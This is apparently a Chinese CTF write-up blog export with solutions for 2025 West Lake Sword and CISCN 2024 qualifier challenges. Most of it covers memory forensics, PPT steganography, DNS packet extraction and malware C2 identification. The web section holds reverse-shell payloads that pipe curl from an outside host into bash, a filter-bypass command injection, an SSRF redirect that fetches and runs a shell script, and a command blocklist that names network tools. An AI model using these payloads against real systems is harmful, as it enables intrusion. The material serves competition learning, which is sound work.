f:            writer = csv.DictWriter(f, fieldnames=[&#x27;userid&#x27;, &#x27;name&#x27;, &#x27;idcard&#x27;, &#x27;phone&#x27;])            writer.writeheader()            writer.writerows(tampered_records)        print(f&quot;Found &#123;len(tampered_records)&#125; tampered records. Details written to tampered_records.csv&quot;)    else:        print(&quot;No tampered records found.&quot;)if __name__ == &#x27;__main__&#x27;:    main()



easyrawencodevol2分析镜像
搜常见后缀
python vol.py -f easyrawencode.raw --profile Win7SP1x64 filescan | grep -E &quot;txt|xml|png|jpg|gif|zip|rar|7z|pdf|doc|docx|php|py|flag&quot;
发现hack.py
python vol.py -f easyrawencode.raw --profile Win7SP1x64 dumpfiles -Q  0x000000003dfdf070 -D ./
import osimport hashlibfrom Crypto.Cipher import AES, PKCS1_OAEPfrom Crypto.PublicKey import RSAhackkey = os.getenv(&#x27;hackkey&#x27;)if not hackkey:    raise ValueError(&quot;Environment variable &#x27;hackkey&#x27; is not set&quot;)with open(&#x27;private.pem&#x27;, &#x27;r&#x27;) as f:    private_key = RSA.import_key(f.read())public_key = private_key.publickey().export_key()aes_key = hashlib.sha256(hackkey.encode()).digest()with open(&#x27;data.csv&#x27;, &#x27;rb&#x27;) as f:    data = f.read()cipher_aes = AES.new(aes_key, AES.MODE_EAX)ciphertext, tag = cipher_aes.encrypt_and_digest(data)cipher_rsa = PKCS1_OAEP.new(RSA.import_key(public_key))enc_aes_key = cipher_rsa.encrypt(aes_key)with open(&#x27;encrypted_data.bin&#x27;, &#x27;wb&#x27;) as f:    f.write(ciphertext)print(enc_aes_key.hex())print(cipher_aes.nonce.hex())print(tag.hex())


根据代码分别查看环境变量hackkey private.pem encrypted_data.bin
python vol.py -f easyrawencode.raw --profile Win7SP1x64 envars | grep -E &#39;hackkey&#39;python vol.py -f easyrawencode.raw --profile Win7SP1x64 filescan | grep -E &quot;private.pem|encrypted_data.bin&quot;

还需要查看当时运行代码后输出的值
python vol.py -f easyrawencode.raw --profile Win7SP1x64 consoles

根据得到的信息还原出data.csv
import hashlibfrom Crypto.Cipher import AES, PKCS1_OAEPfrom Crypto.PublicKey import RSAhackkey = &#x27;4etz0hHbU3TgKqduFL&#x27;aes_key = hashlib.sha256(hackkey.encode()).digest()nonce_hex = &quot;d919c229aab6535efa09a52c589c8f47&quot;nonce = bytes.fromhex(nonce_hex)with open(&#x27;encrypted_data.bin&#x27;, &#x27;rb&#x27;) as f:    ciphertext = f.read()try:    # 使用AES密钥解密数据，先不验证MAC    cipher_aes = AES.new(aes_key, AES.MODE_EAX, nonce=nonce)    data = cipher_aes.decrypt(ciphertext)    with open(&#x27;data.csv&#x27;, &#x27;wb&#x27;) as f:        f.write(data)    print(&quot;解密完成，数据已保存到 data.csv&quot;)except Exception as e:    print(&quot;解密过程中出现错误:&quot;, str(e))


得到一份用户数据
编号,用户名,密码,姓名,性别,出生日期,个性签名(加密版)1,sWEbvrLvgyFO9u8,vHBhvVXS2JvLnTTo,胜屠翰池,男,19761023,korvy4fjEBP6AKeDValKDfzBRK9sKDSIHVakq3NXMMU32,wangguizhi,3E8vleDJFC,桓玉珂,女,20050814,NF+z3NevQqWILNqNvUznlOFie3KLuhIztQNLFnRy3,kofxlSO1C3XEXP3QPH1lEg5WQ,4U86p3uzw7xV,崎邱炜,男,20000710,yutW+1ipTbce3pcz+BEIBS48fX7NF5hh8bWEdigYsHca3vo/dQ0Nl+YFmpl5UD4Onga0hGehitNvMrG4XNFdH+lHEg==4,caijijinotwo1f,PupkzhU9R0g4AoP,禹歆美,女,20120626,t02tKoybGWyIqYL133qtg4+yG3yRvNk=...1997,QV1lQhy1eYi6,s6oJFLTbRPG,公刘芳林,男,19950104,QMvnJnbRC8dbNNSBCX4ZJoFul2q4XilJXc9BQ/rG1998,9tk5p3Y,90909090tianxia,公休生文,男,19790402,RO7+27VoJ3Feb5uPhDmASe27URp91999,40utHZEBKPmxiMO7VrE6CMm,vhathQj2XGSB,云阔,女,19930420,aaf/6mkYPho71FZAjGbRzjZOqx//FgT1fzMfLFzyBAtPQZf9KbMu/Teo/ANL9Ur09CgO5N0UV2+Gr1ncqLy5zZv0p+VhqJwvm7U4ypUyovY=2000,liuguiying,YeE8DXLSPMthwp,沈盈盈,男,19750412,g+1FWgFzuwHOLzZ7Qy1QVWtLhQoRVVQQhUSml8p/d6IeK6NG/8VFV+v0wqCHEIlYFVXtPSncSQ==


根据结构组成猜测aes等加密方法，最后通过rc4解出明文
import pandas as pdimport base64data = pd.read_csv(&#x27;data.csv&#x27;)password = data[&#x27;密码&#x27;]signature = data[&#x27;个性签名(加密版)&#x27;]def rc4_decrypt(ciphertext, key):    try:        ciphertext = base64.b64decode(ciphertext)        key = key.encode(&#x27;utf-8&#x27;)        S = list(range(256))        j = 0        for i in range(256):            j = (j + S[i] + key[i % len(key)]) % 256            S[i], S[j] = S[j], S[i]        i = j = 0        plaintext = bytearray()        for byte in ciphertext:            i = (i + 1) % 256            j = (j + S[i]) % 256            S[i], S[j] = S[j], S[i]            k = S[(S[i] + S[j]) % 256]            plaintext.append(byte ^ k)        return plaintext.decode(&#x27;utf-8&#x27;, errors=&#x27;ignore&#x27;)    except Exception as e:        print(f&quot;Debug - Key length: &#123;len(key)&#125;, Ciphertext length: &#123;len(ciphertext)&#125;&quot;)        return f&quot;Decryption failed: &#123;str(e)&#125;&quot;for i in range(len(password)):    result = rc4_decrypt(signature[i], password[i])    print(f&quot;Entry &#123;i&#125;: &#123;result&#125;&quot;)    if &#x27;DASCTF&#x27; in result:        print(f&quot;Found flag in entry &#123;i&#125;: &#123;result&#125;&quot;)        break



]]></content>
      <categories>
        <category>wp</category>
      </categories>
      <tags>
        <tag>wp</tag>
        <tag>2025竞赛</tag>
        <tag>西湖论剑</tag>
      </tags>
  </entry>
  <entry>
    <title>第十七届全国大学生信息安全竞赛-创新实践能力赛初赛</title>
    <url>/posts/19d58d81/</url>
    <content><![CDATA[miscPower Trajectory Diagram先将npz解压，然后将功耗转成图片分析
from PIL import Imageimport numpy as npind=np.load(&quot;index.npy&quot;)p=np.load(&quot;trace.npy&quot;)for j,a in enumerate(p):    img=Image.new(&quot;1&quot;,(5000,300),255)    for i,v in enumerate(a):        img.putpixel((i,int(v*100)+150),0)    img.save(&quot;output/%s.png&quot;%j)

将四十张图片一组，找到不同的图片，然后在输入的表中找到索引
import numpy as np# 读取数组print(np.load(&#x27;input.npy&#x27;))&#x27;&#x27;&#x27;[&#x27;a&#x27; &#x27;b&#x27; &#x27;c&#x27; &#x27;d&#x27; &#x27;e&#x27; &#x27;f&#x27; &#x27;g&#x27; &#x27;h&#x27; &#x27;i&#x27; &#x27;j&#x27; &#x27;k&#x27; &#x27;l&#x27; &#x27;m&#x27; &#x27;n&#x27; &#x27;o&#x27; &#x27;p&#x27; &#x27;q&#x27; &#x27;r&#x27; &#x27;s&#x27; &#x27;t&#x27; &#x27;u&#x27; &#x27;v&#x27; &#x27;w&#x27; &#x27;x&#x27; &#x27;y&#x27; &#x27;z&#x27; &#x27;0&#x27; &#x27;1&#x27; &#x27;2&#x27; &#x27;3&#x27; &#x27;4&#x27; &#x27;5&#x27; &#x27;6&#x27; &#x27;7&#x27; &#x27;8&#x27; &#x27;9&#x27; &#x27;_&#x27; &#x27;!&#x27; &#x27;@&#x27; &#x27;#&#x27; &#x27;a&#x27; &#x27;b&#x27; &#x27;c&#x27; &#x27;d&#x27; &#x27;e&#x27; &#x27;f&#x27; &#x27;g&#x27; &#x27;h&#x27; &#x27;i&#x27; &#x27;j&#x27; &#x27;k&#x27; &#x27;l&#x27; &#x27;m&#x27; &#x27;n&#x27; &#x27;o&#x27; &#x27;p&#x27; &#x27;q&#x27; &#x27;r&#x27; &#x27;s&#x27; &#x27;t&#x27; &#x27;u&#x27; &#x27;v&#x27; &#x27;w&#x27; &#x27;x&#x27; &#x27;y&#x27; &#x27;z&#x27; &#x27;0&#x27; &#x27;1&#x27; &#x27;2&#x27; &#x27;3&#x27; &#x27;4&#x27; &#x27;5&#x27; &#x27;6&#x27; &#x27;7&#x27; &#x27;8&#x27; &#x27;9&#x27; &#x27;_&#x27; &#x27;!&#x27; &#x27;@&#x27; &#x27;#&#x27; &#x27;a&#x27; &#x27;b&#x27; &#x27;c&#x27; &#x27;d&#x27; &#x27;e&#x27; &#x27;f&#x27; &#x27;g&#x27; &#x27;h&#x27; &#x27;i&#x27; &#x27;j&#x27; &#x27;k&#x27; &#x27;l&#x27; &#x27;m&#x27; &#x27;n&#x27; &#x27;o&#x27; &#x27;p&#x27; &#x27;q&#x27; &#x27;r&#x27; &#x27;s&#x27; &#x27;t&#x27; &#x27;u&#x27; &#x27;v&#x27; &#x27;w&#x27; &#x27;x&#x27; &#x27;y&#x27; &#x27;z&#x27; &#x27;0&#x27; &#x27;1&#x27; &#x27;2&#x27; &#x27;3&#x27; &#x27;4&#x27; &#x27;5&#x27; &#x27;6&#x27; &#x27;7&#x27; &#x27;8&#x27; &#x27;9&#x27; &#x27;_&#x27; &#x27;!&#x27; &#x27;@&#x27; &#x27;#&#x27; &#x27;a&#x27; &#x27;b&#x27; &#x27;c&#x27; &#x27;d&#x27; &#x27;e&#x27; &#x27;f&#x27; &#x27;g&#x27; &#x27;h&#x27; &#x27;i&#x27; &#x27;j&#x27; &#x27;k&#x27; &#x27;l&#x27; &#x27;m&#x27; &#x27;n&#x27; &#x27;o&#x27; &#x27;p&#x27; &#x27;q&#x27; &#x27;r&#x27; &#x27;s&#x27; &#x27;t&#x27; &#x27;u&#x27; &#x27;v&#x27; &#x27;w&#x27; &#x27;x&#x27; &#x27;y&#x27; &#x27;z&#x27; &#x27;0&#x27; &#x27;1&#x27; &#x27;2&#x27; &#x27;3&#x27; &#x27;4&#x27; &#x27;5&#x27; &#x27;6&#x27; &#x27;7&#x27; &#x27;8&#x27; &#x27;9&#x27; &#x27;_&#x27; &#x27;!&#x27; &#x27;@&#x27; &#x27;#&#x27; &#x27;a&#x27; &#x27;b&#x27; &#x27;c&#x27; &#x27;d&#x27; &#x27;e&#x27; &#x27;f&#x27; &#x27;g&#x27; &#x27;h&#x27; &#x27;i&#x27; &#x27;j&#x27; &#x27;k&#x27; &#x27;l&#x27; &#x27;m&#x27; &#x27;n&#x27; &#x27;o&#x27; &#x27;p&#x27; &#x27;q&#x27; &#x27;r&#x27; &#x27;s&#x27; &#x27;t&#x27; &#x27;u&#x27; &#x27;v&#x27; &#x27;w&#x27; &#x27;x&#x27; &#x27;y&#x27; &#x27;z&#x27; &#x27;0&#x27; &#x27;1&#x27; &#x27;2&#x27; &#x27;3&#x27; &#x27;4&#x27; &#x27;5&#x27; &#x27;6&#x27; &#x27;7&#x27; &#x27;8&#x27; &#x27;9&#x27; &#x27;_&#x27; &#x27;!&#x27; &#x27;@&#x27; &#x27;#&#x27; &#x27;a&#x27; &#x27;b&#x27; &#x27;c&#x27; &#x27;d&#x27; &#x27;e&#x27; &#x27;f&#x27; &#x27;g&#x27; &#x27;h&#x27; &#x27;i&#x27; &#x27;j&#x27; &#x27;k&#x27; &#x27;l&#x27; &#x27;m&#x27; &#x27;n&#x27; &#x27;o&#x27; &#x27;p&#x27; &#x27;q&#x27; &#x27;r&#x27; &#x27;s&#x27; &#x27;t&#x27; &#x27;u&#x27; &#x27;v&#x27; &#x27;w&#x27; &#x27;x&#x27; &#x27;y&#x27; &#x27;z&#x27; &#x27;0&#x27; &#x27;1&#x27; &#x27;2&#x27; &#x27;3&#x27; &#x27;4&#x27; &#x27;5&#x27; &#x27;6&#x27; &#x27;7&#x27; &#x27;8&#x27; &#x27;9&#x27; &#x27;_&#x27; &#x27;!&#x27; &#x27;@&#x27; &#x27;#&#x27; &#x27;a&#x27; &#x27;b&#x27; &#x27;c&#x27; &#x27;d&#x27; &#x27;e&#x27; &#x27;f&#x27; &#x27;g&#x27; &#x27;h&#x27; &#x27;i&#x27; &#x27;j&#x27; &#x27;k&#x27; &#x27;l&#x27; &#x27;m&#x27; &#x27;n&#x27; &#x27;o&#x27; &#x27;p&#x27; &#x27;q&#x27; &#x27;r&#x27; &#x27;s&#x27; &#x27;t&#x27; &#x27;u&#x27; &#x27;v&#x27; &#x27;w&#x27; &#x27;x&#x27; &#x27;y&#x27; &#x27;z&#x27; &#x27;0&#x27; &#x27;1&#x27; &#x27;2&#x27; &#x27;3&#x27; &#x27;4&#x27; &#x27;5&#x27; &#x27;6&#x27; &#x27;7&#x27; &#x27;8&#x27; &#x27;9&#x27; &#x27;_&#x27; &#x27;!&#x27; &#x27;@&#x27; &#x27;#&#x27; &#x27;a&#x27; &#x27;b&#x27; &#x27;c&#x27; &#x27;d&#x27; &#x27;e&#x27; &#x27;f&#x27; &#x27;g&#x27; &#x27;h&#x27; &#x27;i&#x27; &#x27;j&#x27; &#x27;k&#x27; &#x27;l&#x27; &#x27;m&#x27; &#x27;n&#x27; &#x27;o&#x27; &#x27;p&#x27; &#x27;q&#x27; &#x27;r&#x27; &#x27;s&#x27; &#x27;t&#x27; &#x27;u&#x27; &#x27;v&#x27; &#x27;w&#x27; &#x27;x&#x27; &#x27;y&#x27; &#x27;z&#x27; &#x27;0&#x27; &#x27;1&#x27; &#x27;2&#x27; &#x27;3&#x27; &#x27;4&#x27; &#x27;5&#x27; &#x27;6&#x27; &#x27;7&#x27; &#x27;8&#x27; &#x27;9&#x27; &#x27;_&#x27; &#x27;!&#x27; &#x27;@&#x27; &#x27;#&#x27; &#x27;a&#x27; &#x27;b&#x27; &#x27;c&#x27; &#x27;d&#x27; &#x27;e&#x27; &#x27;f&#x27; &#x27;g&#x27; &#x27;h&#x27; &#x27;i&#x27; &#x27;j&#x27; &#x27;k&#x27; &#x27;l&#x27; &#x27;m&#x27; &#x27;n&#x27; &#x27;o&#x27; &#x27;p&#x27; &#x27;q&#x27; &#x27;r&#x27; &#x27;s&#x27; &#x27;t&#x27; &#x27;u&#x27; &#x27;v&#x27; &#x27;w&#x27; &#x27;x&#x27; &#x27;y&#x27; &#x27;z&#x27; &#x27;0&#x27; &#x27;1&#x27; &#x27;2&#x27; &#x27;3&#x27; &#x27;4&#x27; &#x27;5&#x27; &#x27;6&#x27; &#x27;7&#x27; &#x27;8&#x27; &#x27;9&#x27; &#x27;_&#x27; &#x27;!&#x27; &#x27;@&#x27; &#x27;#&#x27; &#x27;a&#x27; &#x27;b&#x27; &#x27;c&#x27; &#x27;d&#x27; &#x27;e&#x27; &#x27;f&#x27; &#x27;g&#x27; &#x27;h&#x27; &#x27;i&#x27; &#x27;j&#x27; &#x27;k&#x27; &#x27;l&#x27; &#x27;m&#x27; &#x27;n&#x27; &#x27;o&#x27; &#x27;p&#x27; &#x27;q&#x27; &#x27;r&#x27; &#x27;s&#x27; &#x27;t&#x27; &#x27;u&#x27; &#x27;v&#x27; &#x27;w&#x27; &#x27;x&#x27; &#x27;y&#x27; &#x27;z&#x27; &#x27;0&#x27; &#x27;1&#x27; &#x27;2&#x27; &#x27;3&#x27; &#x27;4&#x27; &#x27;5&#x27; &#x27;6&#x27; &#x27;7&#x27; &#x27;8&#x27; &#x27;9&#x27; &#x27;_&#x27; &#x27;!&#x27; &#x27;@&#x27; &#x27;#&#x27; &#x27;a&#x27; &#x27;b&#x27; &#x27;c&#x27; &#x27;d&#x27; &#x27;e&#x27; &#x27;f&#x27; &#x27;g&#x27; &#x27;h&#x27; &#x27;i&#x27; &#x27;j&#x27; &#x27;k&#x27; &#x27;l&#x27; &#x27;m&#x27; &#x27;n&#x27; &#x27;o&#x27; &#x27;p&#x27; &#x27;q&#x27; &#x27;r&#x27; &#x27;s&#x27; &#x27;t&#x27; &#x27;u&#x27; &#x27;v&#x27; &#x27;w&#x27; &#x27;x&#x27; &#x27;y&#x27; &#x27;z&#x27; &#x27;0&#x27; &#x27;1&#x27; &#x27;2&#x27; &#x27;3&#x27; &#x27;4&#x27; &#x27;5&#x27; &#x27;6&#x27; &#x27;7&#x27; &#x27;8&#x27; &#x27;9&#x27; &#x27;_&#x27; &#x27;!&#x27; &#x27;@&#x27; &#x27;#&#x27; &#x27;a&#x27; &#x27;b&#x27; &#x27;c&#x27; &#x27;d&#x27; &#x27;e&#x27; &#x27;f&#x27; &#x27;g&#x27; &#x27;h&#x27; &#x27;i&#x27; &#x27;j&#x27; &#x27;k&#x27; &#x27;l&#x27; &#x27;m&#x27; &#x27;n&#x27; &#x27;o&#x27; &#x27;p&#x27; &#x27;q&#x27; &#x27;r&#x27; &#x27;s&#x27; &#x27;t&#x27; &#x27;u&#x27; &#x27;v&#x27; &#x27;w&#x27; &#x27;x&#x27; &#x27;y&#x27; &#x27;z&#x27; &#x27;0&#x27; &#x27;1&#x27; &#x27;2&#x27; &#x27;3&#x27; &#x27;4&#x27; &#x27;5&#x27; &#x27;6&#x27; &#x27;7&#x27; &#x27;8&#x27; &#x27;9&#x27; &#x27;_&#x27; &#x27;!&#x27; &#x27;@&#x27; &#x27;#&#x27; &#x27;a&#x27; &#x27;b&#x27; &#x27;c&#x27; &#x27;d&#x27; &#x27;e&#x27; &#x27;f&#x27; &#x27;g&#x27; &#x27;h&#x27; &#x27;i&#x27; &#x27;j&#x27; &#x27;k&#x27; &#x27;l&#x27; &#x27;m&#x27; &#x27;n&#x27; &#x27;o&#x27; &#x27;p&#x27; &#x27;q&#x27; &#x27;r&#x27; &#x27;s&#x27; &#x27;t&#x27; &#x27;u&#x27; &#x27;v&#x27; &#x27;w&#x27; &#x27;x&#x27; &#x27;y&#x27; &#x27;z&#x27; &#x27;0&#x27; &#x27;1&#x27; &#x27;2&#x27; &#x27;3&#x27; &#x27;4&#x27; &#x27;5&#x27; &#x27;6&#x27; &#x27;7&#x27; &#x27;8&#x27; &#x27;9&#x27; &#x27;_&#x27; &#x27;!&#x27; &#x27;@&#x27; &#x27;#&#x27;]&#x27;&#x27;&#x27;

对比后得到登录密码_ciscn_2024_
火锅链观光打卡连接MetaMask后开始游戏


神秘文件PPT第三页
UGF5dDQ6NmYtNDA=解base64得到Payt4:6f-40

PPT第五页
备注中的字符串循环解密base64得到pArt5:5f-90d
左上角的UGFyVDY6ZC0ybase64解密得到ParT6:d-2

在ppt\slides\slide4.xml中找到第七部分
ROT13然后base64 PART7=22b3
&lt;p:cNvPr id=&quot;4&quot; name=&quot;HRSFIQp9ZwWvZj==&quot;/&gt;&lt;p:cNvPr id=&quot;5&quot; name=&quot;ROT13(All)&quot;/&gt;


在ppt\slideLayouts\slideLayout2.xml或者幻灯片母版中可以看到第八部分
去除B,b,1,3后base64  paRt8:87e
&lt;a:t&gt;c1GFSbd3Dg6BODbdl&lt;/a:t&gt;&lt;a:t&gt;Remove All &lt;/a:t&gt;&lt;a:t&gt;’B ’/’b’ /’1 ’/’3’&lt;/a:t&gt;


在ppt\media\image57.jpg底部存在密文，base64解密得到parT9:dee

在ppt\comments\comment1.xml中得到第十部分
维吉尼亚后base64 PARt10:9&#125;
&lt;p:text&gt;ZYWJbIYnFhq9&lt;/p:text&gt;&lt;p:text&gt;What is this？&lt;/p:text&gt;&lt;p:text&gt;Vigenere cipher is good！&lt;/p:text&gt;&lt;p:text&gt;Aha，the key is&lt;/p:text&gt;&lt;p:text&gt;Is what？&lt;/p:text&gt;&lt;p:text&gt;furry&lt;/p:text&gt;&lt;p:text&gt;🆗&lt;/p:text&gt;

在docProps\app.xml得到加密方式，docProps\core.xml得到密文和密钥
Bifid解密后base64 Part1:flag&#123;e
&lt;Manager&gt;Bifid cipher&lt;/Manager&gt;&lt;dc:title&gt;这是一个标题 QFCfpPQ6ZymuM3gq&lt;/dc:title&gt;&lt;dc:creator&gt;Administrator;Key:lanjing&lt;/dc:creator&gt;



将ppt\embeddings\Microsoft_Word_Document.docx改成zip解压
word\document.xml得到第二部分
凯撒偏移10后base64 part2:675efb
&lt;w:t&gt;这&lt;/w:t&gt;&lt;w:t&gt;o&lt;/w:t&gt;&lt;w:t&gt;ffset:10&lt;/w:t&gt;&lt;w:t&gt;里&lt;/w:t&gt;&lt;w:t&gt;原来似乎有什么，后来好像被小C&lt;/w:t&gt;&lt;w:t&gt;aesar&lt;/w:t&gt;&lt;w:t&gt;抱走了！&lt;/w:t&gt;&lt;w:t&gt;mQPinNS6Xtm1JGJs&lt;/w:t&gt;


在PPT中打开宏编辑器
Sub crypto(sMessage, strKey)    Dim kLen, x, y, i, j, temp    Dim s(256), k(256)    kLen = Len(strKey)    For i = 0 To 255        s(i) = i        k(i) = Asc(Mid(strKey, (i Mod kLen) + 1, 1))    Next    j = 0    For i = 0 To 255        j = (j + k(i) + s(i)) Mod 256        temp = s(i)        s(i) = s(j)        s(j) = temp    Next    x = 0    y = 0    For i = 1 To 3072        x = (x + 1) Mod 256        y = (y + s(x)) Mod 256        temp = s(x)        s(x) = s(y)        s(y) = temp    Next    For i = 1 To Len(sMessage)        x = (x + 1) Mod 256        y = (y + s(x)) Mod 256        temp = s(x)        s(x) = s(y)        s(y) = temp        crypto = crypto &amp; (s((s(x) + s(y)) Mod 256) Xor Asc(Mid(sMessage, i, 1))) &amp; &quot;,&quot;    Next    &#x27;i13POMdzEAzHfy4dGS+vUA==(After base64)End Sub

rc4后base64得到PArt3:3-34
将一到十部分拼接在一起：flag&#123;e675efb3-346f-405f-90dd-222b387edee9&#125;
通风机修补文件头，加上GJK后用STEP 7 Micro/WIN打开
符号表里注释的字符串base64得到flag

盗版软件运行hackexe.exe会生成loader.exe和output.png
stegsolve发现图片在红色通道每隔一位组合起来是zip，写脚本提取出来
from PIL import Imagea=Image.open(&#x27;output.png&#x27;)b=list(a.getdata())e=[]for i in range(0,len(b),2):    e.append(b[i][0])f=open(&#x27;1.zip&#x27;,&#x27;wb&#x27;)f.write(bytes(e))f.close()

解压后得到.b文件
r()J$nEA&#x27;r!!#;^5u:HM1&quot;&#x27;W(Mc*q[&lt;_/-H(eBQ_+@m$P8kMf4a[h&gt;1:e3=VX?9p=!\&gt;H[_9!-P!Q!d_;F+/NMc([U69Id&gt;ct7iR(^gBUKlR.n!/lA`!!!!iKtqeC8-.(6Mb&quot;[QMa/CV!RTk-8H6e+1!)_&gt;1l+[&#x27;ejqO2X?j\E%7($238erL9ERs6#Xpc$FkBeaMa/OZ!RPFEM[W-EMa/7R!RO,j&quot;Gf?G6!.Ga!ROtQ6!-EU6!?g3ll\Sls57!F=^&quot;@S&#x27;&#x27;W&#x27;hs8Q@r^3=WR?SaG;!&#x27;sXWM&lt;7?[m%=@Z!(i%/8\&gt;*)+T!Ns8F&amp;Q@8VuM%M=EmC9Qqfgs4&#x27;f&quot;l=^2!!!$.f\g`/F!&lt;:Sa$:.up:e`[d9ejFSs1h0^_FX^B8;Y/K]&#x27;9g`i;_=uM8s?B6!-g;i^eq%6+WJ\FCG4&quot;Ktqd;8cR(Yjlhm.!!#QBlju^Ei_;/LC&#x27;6h)8;[..\cUR+?iSZ/p],bC8;&quot;i&#x27;?A\Aj5XAOd!&quot;],16!-[7njkLW6+U0o;s&quot;&amp;08;Y5UM8r=Fa[q?Y8;Z%kM&gt;9HK!nkY%s4)bs!.?7t6!%3&amp;!&#x27;gMa6!.k%&gt;!]_-0+Tc:eQ5m&gt;\ohmb@K4kLs3Bjks8W*i!Q.GW`^kgWFgOI7k?)I!=hET4.LJIugAf\

对文件内容进行base85后丢到沙箱中
得到c2地址39.100.72.235

然后分析3842.dmp
使用strings搜索所有http或者ftp开头的链接
strings 3842.dmp | grep -iE &quot;^(http|ftp|chrome|firefox).*\.(txt|xml|png|jpg|gif|zip|rar|7z|pdf|doc|docx|php|py|flag|exe)$&quot; &gt; 1.txt
然后去除 baidu.com xunfei.com 这种官方网站
根据题目描述在网上下了一个盗版软件 很明显是winhack.com了

拼接后md5
winhack.com39.100.72.235
flag&#123;096e8b0f9daf10869f013c1b7efda3fd&#125;
p&amp;p利用溢出修改flag写入文件位置，然后访问&#x2F;static&#x2F;1即可获得flag
import requestsimport urllib.parse as parseurl=&quot;http://8.147.131.163:39352/upload?name=&quot;+&#x27;a&#x27;*(112+16+6)+&#x27;a&#x27;*0x1e+&#x27;static/1&#x27;print(url)r=requests.get(url)url=&quot;http://8.147.131.163:39352/test&quot;r=requests.get(url)print(r.text)

Tough_DNS
题目内容：DNS的世界充满了多变的字符，接下来我将直接给你答案：56 16 26 93 66 53 16 56 d2 03 26 93 56

一打开就是大量请求一串10的数据

提取出来，开头7个1，一眼二维码
111111101100101111111100000100100101000001101110101010101011101101110101001001011101101110101110001011101100000100000001000001111111101010101111111000000000110000000000111100101010010011101010010000010110111111011001111000101100001001110000110100001000000101111001001100000000000001111001110010111111100100011010110100000100011010000100101110100001000010110101110101110110100110101110101011110101100100000101110001111001111111101111001111100


扫码得到15f9792dba5c

然后用tshark提取请求的txt字段
tshark -r Tough_DNS.pcapng -T json -e dns.txt -Y &quot;dns.txt&quot; &gt; 1.txt
分析发现每隔一位刚好组成504B，python提取转文件
import jsonf=open(&#x27;1.txt&#x27;)d=f.read()d=json.loads(d)e1=&#x27;&#x27;e2=&#x27;&#x27;for i in range(0,len(d),2):    e1+=d[i][&#x27;_source&#x27;][&#x27;layers&#x27;][&#x27;dns.txt&#x27;][0]    e2+=d[i+1][&#x27;_source&#x27;][&#x27;layers&#x27;][&#x27;dns.txt&#x27;][0]print(len(e1))print(len(e2))f=open(&#x27;1.bin&#x27;,&#x27;wb&#x27;)f.write(bytes.fromhex(e1[1:]))f.close()f=open(&#x27;2.bin&#x27;,&#x27;wb&#x27;)f.write(bytes.fromhex(e2[1:]))f.close()

有两个文件，压缩包和PGP文件

解压密码是二维码的结果，解压得到secret.gpg
用PGPTool导入secret.gpg

然后解密提取出来的文件，密码在题目描述中
根据ascii码范围，前面应该是2-7，调整位置65 61 62 39 66 35 61 65 2d 30 62 39 65，得到eab9f5ae-0b9e

得到flag&#123;79830a47-faf7-4067-b585-145776f833cd&#125;

webSimple_php&lt;?phpini_set(&#x27;open_basedir&#x27;, &#x27;/var/www/html/&#x27;);error_reporting(0);if(isset($_POST[&#x27;cmd&#x27;]))&#123;    $cmd = escapeshellcmd($_POST[&#x27;cmd&#x27;]);     if (!preg_match(&#x27;/ls|dir|nl|nc|cat|tail|more|flag|sh|cut|awk|strings|od|curl|ping|\*|sort|ch|zip|mod|sl|find|sed|cp|mv|ty|grep|fd|df|sudo|more|cc|tac|less|head|\.|&#123;|&#125;|tar|zip|gcc|uniq|vi|vim|file|xxd|base64|date|bash|env|\?|wget|\&#x27;|\&quot;|id|whoami/i&#x27;, $cmd)) &#123;         system($cmd);&#125;&#125;show_source(__FILE__);?&gt;

没有过滤 str_replace ，那么就可以通过str_replace来绕过这一大串过滤
比如 str_replace(z,count(),whozami); 就可以拿到 whoami
因为题目中是system，所以再套一层php -r命令来反弹shell
poc
cmd=php -r system((str_replace(z,count(),bazse64_decozde))(Y3VybCA0Ny45OS43Ny41MnxiYXNo));

反弹shell后目录中没有flag，通过 ps -aux 查看发现还有mysql服务
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMANDroot           1  0.0  0.0   2364   512 pts/0    Ss+  03:49   0:00 tail -f /dev/nullroot          27  0.0  3.8  76568 20092 ?        Ss   03:49   0:00 /usr/sbin/apache2 -k startwww-data      30  0.0  1.7  76592  9192 ?        S    03:49   0:00 /usr/sbin/apache2 -k startwww-data      31  0.0  2.5  77160 13380 ?        S    03:49   0:00 /usr/sbin/apache2 -k startwww-data      32  0.0  1.7  76640  9192 ?        S    03:49   0:00 /usr/sbin/apache2 -k startwww-data      33  0.0  2.5  76844 13196 ?        S    03:49   0:00 /usr/sbin/apache2 -k startwww-data      34  0.0  2.4  76648 12804 ?        S    03:49   0:00 /usr/sbin/apache2 -k startroot         166  0.0  0.3   2420  1620 pts/0    S+   03:49   0:00 /bin/sh /usr/bin/mysqld_safemysql        279  0.0 15.9 1083992 83680 pts/0   Sl+  03:49   0:00 /usr/sbin/mariadbd --basedir=/usr --datadir=/var/lib/mysql --plugin-dir=/usr/lib/mysql/plugin --user=mysql --skip-log-error --pid-file=/run/mysqld/mysqld.pid --socket=/run/mysqld/mysqld.sockroot         280  0.0  0.2   5740  1056 pts/0    S+   03:49   0:00 logger -t mysqld -p daemon errorroot         320  0.0  0.0      0     0 pts/0    Z+   03:49   0:00 [debian-start] &lt;defunct&gt;

直接 mysql -u root -proot 连接，但是没有回显，需要用错误语句来触发报错回显



其他做法
%0a绕过
cmd=l%0as+/
通过hex2bin转换
cmd=php+-r+eval(hex2bin(substr(aa6563686f20606d7973716c202d7520726f6f74202d7027726f6f7427202d652027757365205048505f434d533b73656c656374202a2066726f6d20463161675f5365335265373b27603b,2)));
easycms
REMOTE_ADDR绕不过去，肯定要打ssrf
后台地址被修改了，尝试爆破无果
在官方手册中找前台有远程请求的接口
最终找到一个二维码函数
index.php?s=api&amp;c=api&amp;m=qrcode&amp;thumb=中间LOGO&amp;text=内容&amp;size=大小值&amp;level=容错率


在自己的服务器上起一个flask，重定向到 http://127.0.0.1/ cmd就能执行命令了，用ctfshow的一键反弹shell
# coding=utf-8from flask import *app = Flask(__name__)app.secret_key = &#x27;*************************&#x27;@app.route(&#x27;/&#x27;,methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])def index():    return redirect(&quot;http://127.0.0.1/flag.php?cmd=curl%20https://your-shell.com/47.99.77.52:1234%20|%20sh&quot;)if __name__ == &quot;__main__&quot;:    app.run(host=&#x27;0.0.0.0&#x27;,port=80,debug=True)

然后发包
http://eci-2ze9sa3j2fhr9odtqwsd.cloudeci1.ichunqiu.com/index.php?s=api&amp;c=api&amp;m=qrcode&amp;thumb=http://47.99.77.52/

easycms_revenge继续用上一题的payload，网页返回二维码生成失败
